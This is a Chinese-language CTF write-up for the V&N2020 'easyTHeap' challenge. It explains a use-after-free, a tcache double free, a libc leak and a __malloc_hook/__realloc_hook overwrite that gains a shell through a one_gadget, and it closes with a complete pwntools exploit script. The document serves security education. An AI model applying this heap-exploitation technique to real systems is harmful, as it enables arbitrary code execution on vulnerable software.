# [V&N2020 公开赛]easyTHeap


利用tache的double free来修改malloc_hook。并利用realloc来使onegadget满足要求

<!--more-->

# 涉及知识

+ tcache attack
+ realloc_hook和malloc_hook的配合
+ 修改程序ld和libc

# 程序分析

## 保护机制

![](https://raw.githubusercontent.com/TroyeCriss/blog_img/master/img/image-20200418162905675.png)

保护全开，由于靶机环境是ubuntu18，而本机环境是ubuntu16所以需要修改ld和libc，修改方法见这篇文章。[修改程序为指定libc版本 & pwndbg安装](https://troyecriss.github.io/2020/04/17/修改程序为指定libc版本-pwndbg安装/)

![](https://raw.githubusercontent.com/TroyeCriss/blog_img/master/img/image-20200410181233028.png)

## 漏洞分析



程序有四个功能，分别为添加，编辑，显示和删除。程序的漏洞出现在删除部分

![](https://raw.githubusercontent.com/TroyeCriss/blog_img/master/img/image-20200418163215748.png)

当free掉分配的堆块后，没有堆指针清理，存在UAF漏洞。如何利用这一个漏洞获取shell呢？

由于libc的版本是2.27所以存在tcache bins。tcache bins的保护机制不是十分的严格，使用double free时不会对目标地址进行检测，所以这里我们可以利用tcache的double free来达到任意地址分配。

那我们分配哪个地址呢？程序开启了PIE，我们不能直接写入地址，必须要泄漏地址才可以利用。我们知道unsorted bins被free掉后可以泄漏libc的地址，但是由于存在tcache bins，我们必须将tcache bins存满后，free掉的堆块才会分配到unsorted bins中，可以程序仅能free掉3次，我们该如何利用呢？

这里我们换个思路，我们分配到堆块的起始位置，因为这里记录了tcache bins的信息。当我们分配了这个堆块后，修改tcache bins的大小为7，就可以实现unsorted bin分配。同时修改tcache bins链表信息，可以达到任意地址分配的作用。

```` python
add(0x100) #0
add(0x10)  #1
delete(0)
delete(0)
show(0)

heap=u64(sh.recvuntil('\n').replace('\n','').ljust(8,'\x00'))-0x250
````

我们先分配两个堆块，释放0堆块两次后，就可以泄露出heap的地址

````python
add(0x100) #2
edit(2,p64(heap))
add(0x100) #3
add(0x100) #4
````

分配一个堆块，并对next进行修改后，再分配两次，我们就可以获得heap起始位置的堆块。

```` python
edit(4,'\x00'*15+'\x07')
delete(0)
show(0)
libc_base=u64(sh.recvuntil('\n').replace('\n','').ljust(8,'\x00'))-0x3afca0
gadget=[0x4f2c5,0x4f322,0x10a38c]
one_gadget=libc_base+0xdeed2
malloc_hook=libc_base+libc.symbols['__malloc_hook']
realloc=libc_base+libc.symbols['realloc']
````

我们先将tcache bins的大小修改为7，填满tcache。当我们再次free掉0堆块时，将会被放入unsorted bins中，因此我们就可以泄露出libc的地址并计算出所需gadget的地址。

接下来的思路就很清晰了，分配_\_malloc_hook附近的堆块，修改__malloc_hook为one_gadget，然后再次分配一个堆块，来获取shell。但是博主刚开始尝试使用这个方法时，不能成功，因为不能满足one_gadget的限制条件，那么该怎么办呢？

这里利用了一个有趣的技巧，修改\_\_malloc_hook为realloc，将\_\_realloc_hook修改为\_\_one\_gadget。这里利用了realloc里面push等调整栈的命令，使调用one_gadget时满足堆栈限制条件。

这里详细讲解一下调试方法，假如我们刚开始修改__malloc_ho0k为realloc,one_gadget的限制条件是rsp+0x70=0

```` python
edit(4,'\x00'*15+'\x01'+p64(0)*21+p64(malloc_hook-8))
add(0x100) #5
edit(5,p64(one_gadget)+p64(realloc))
````

我们利用gdb调试，在onegadget处下断点后。

![](https://raw.githubusercontent.com/TroyeCriss/blog_img/master/img/image-20200418165749768.png)

我们可以发现，在rsp+0x70处，不为零，但是rsp+0x88处为零，我们可以利用realloc加一个偏移量来使得rsp+0x70处值为零。我们先看一下realloc函数的内容。

![](https://raw.githubusercontent.com/TroyeCriss/blog_img/master/img/1.png)

如果我们不从realloc一开始执行，而是从realloc+6开始执行，将会少执行3个push，我们栈就可以抬高0x18因此我们执行one_gadget时其rsp+0x70处的位置将会是之前的rsp+0x88处，从而满足限制条件。

# EXP

````python
from pwn import *
from LibcSearcher import LibcSearcher
from roputils import ROP
context.arch='amd64'
elf=ELF('./pwn3')
#sh=remote('node3.buuoj.cn',28286)
sh=process('./pwn2')
libc=ELF('/glibc/2.27/amd64/lib/libc-2.27.so')
#context.log_level='debug'
# gdb.attach(sh,'''
# b*0x0000000000400619
# c
# ''')
def add(size):
	sh.recvuntil(': ')
	sh.sendline('1')
	sh.recvuntil('size?')
	sh.sendline(str(size))

def edit(index,content):
	sh.recvuntil(': ')
	sh.sendline('2')
	sh.recvuntil('idx?')
	sh.sendline(str(index))
	sh.recvuntil('content:')
	sh.sendline(content)

def show(index):
	sh.recvuntil(': ')
	sh.sendline('3')
	sh.recvuntil('idx?')
	sh.sendline(str(index))

def delete(index):
	sh.recvuntil(': ')
	sh.sendline('4')
	sh.recvuntil('idx?')
	sh.sendline(str(index))

add(0x100) #0
add(0x10)  #1
delete(0)
delete(0)
show(0)

heap=u64(sh.recvuntil('\n').replace('\n','').ljust(8,'\x00'))-0x250
print hex(heap)
add(0x100) #2
edit(2,p64(heap))
add(0x100) #3
add(0x100) #4
edit(4,'\x00'*15+'\x07')
delete(0)
show(0)
libc_base=u64(sh.recvuntil('\n').replace('\n','').ljust(8,'\x00'))-0x3afca0
gadget=[0x4f2c5,0x4f322,0x10a38c]
one_gadget=libc_base+0xdeed2
malloc_hook=libc_base+libc.symbols['__malloc_hook']
realloc=libc_base+libc.symbols['realloc']
print hex(realloc)
edit(4,'\x00'*15+'\x01'+p64(0)*21+p64(malloc_hook-8))
add(0x100) #5
edit(5,p64(one_gadget)+p64(realloc+6))

add(0x10)
#gdb.attach(sh)
sh.interactive()
````

# 参考

[onegadget不起作用](https://blog.csdn.net/Maxmalloc/article/details/102535427)

[V&N2020 公开赛\]easyTHeap pwn_debug注意事项](https://www.cnblogs.com/luoleqi/p/12488986.html)


